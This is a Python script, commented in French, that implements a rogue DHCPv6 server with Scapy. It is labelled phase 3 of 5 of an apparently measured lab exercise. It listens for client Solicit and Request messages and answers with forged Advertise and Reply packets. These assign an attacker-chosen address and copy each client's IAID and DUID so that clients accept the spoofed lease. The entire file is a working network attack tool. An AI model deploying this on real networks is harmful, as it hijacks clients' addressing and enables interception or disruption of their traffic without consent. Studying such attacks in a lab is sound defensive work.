#!/usr/bin/env python3
"""
rogue_dhcpv6.py — serveur DHCPv6 pirate (Phase 3 / 5), version mesurable.
Repond au Solicit (Advertise) et au Request (Reply) en incluant une option
IA_NA / IAADDR qui attribue une adresse pirate (2001:db8:bad::1000). L'IAID et
le ClientId de la requete sont REPRIS (sinon le client ignore la reponse :
"no IAADDR option").
"""
import argparse
from scapy.all import sniff, sendp, Ether, IPv6, UDP
from scapy.layers.dhcp6 import (
    DHCP6_Solicit, DHCP6_Advertise, DHCP6_Request, DHCP6_Reply,
    DHCP6OptIA_NA, DHCP6OptIAAddress, DHCP6OptServerId, DHCP6OptClientId,
    DUID_LLT,
)

PIRATE_ADDR = "2001:db8:bad::1000"
SERVER_DUID = DUID_LLT(lladdr="02:00:00:00:00:66")


def build_reply(req, attacker_ip, is_reply):
    cls = DHCP6_Reply if is_reply else DHCP6_Advertise
    trid = req.trid
    # reprendre l'IAID du client (indispensable), sinon 0x11111111 par defaut
    iaid = req[DHCP6OptIA_NA].iaid if DHCP6OptIA_NA in req else 0x11111111
    # copier UNIQUEMENT le DUID client dans une option propre (ne pas reutiliser
    # la couche req[...] qui traine encore les options suivantes en payload)
    cid = DHCP6OptClientId(duid=req[DHCP6OptClientId].duid) if DHCP6OptClientId in req else DHCP6OptClientId()
    ia = DHCP6OptIA_NA(iaid=iaid, T1=200, T2=300,
                       ianaopts=[DHCP6OptIAAddress(addr=PIRATE_ADDR,
                                                   preflft=300, validlft=600)])
    return (Ether(src="02:00:00:00:00:66", dst=req[Ether].src) /
            IPv6(src=attacker_ip, dst=req[IPv6].src) /
            UDP(sport=547, dport=546) /
            cls(trid=trid) /
            DHCP6OptServerId(duid=SERVER_DUID) /
            cid / ia)


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--iface", required=True)
    p.add_argument("--attacker-ip", default="fe80::66")
    args = p.parse_args()

    def handle(pkt):
        if IPv6 not in pkt or Ether not in pkt:
            return
        if DHCP6_Solicit in pkt:
            sendp(build_reply(pkt, args.attacker_ip, False), iface=args.iface, verbose=False)
            print(f"[rogue-dhcpv6] Advertise (addr pirate {PIRATE_ADDR}) -> {pkt[IPv6].src}")
        elif DHCP6_Request in pkt:
            sendp(build_reply(pkt, args.attacker_ip, True), iface=args.iface, verbose=False)
            print(f"[rogue-dhcpv6] Reply (addr pirate {PIRATE_ADDR}) -> {pkt[IPv6].src}")

    print(f"Serveur DHCPv6 pirate a l'ecoute sur {args.iface} (attribue {PIRATE_ADDR})...")
    sniff(iface=args.iface, filter="udp port 547", prn=handle, store=False)


if __name__ == "__main__":
    main()